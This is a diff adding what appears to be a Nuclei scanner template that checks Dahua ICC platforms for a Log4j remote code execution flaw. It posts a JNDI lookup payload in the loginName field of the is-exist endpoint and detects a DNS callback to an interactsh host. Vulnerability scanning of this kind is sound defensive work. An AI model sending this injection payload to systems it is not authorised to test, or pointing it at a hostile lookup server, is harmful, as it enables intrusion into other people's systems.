@@ -1,0 +1,29 @@
+id: dahua-icc-log4j-rce
+
+info:
+  name: Dahua Icc is-exist Log4j - Remote Code Execution 
+  author: qwtd
+  severity: high
+  description: 大华智能物联ICC综合管理平台 log4j 反序列化漏洞
+  tags: Dahua-ICC
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/evo-apigw/evo-brm/1.2.0/user/is-exist"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+      Content-Type: application/json;charset=utf-8
+      Accept-Encoding: gzip
+      Connection: close
+
+    body: |
+      { "loginName": "${jndi://{{interactsh-url}}}" }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "dns"
+        part: interactsh_protocol # This needs to be set up in your Nuclei configuration to capture and analyze DNS requests.
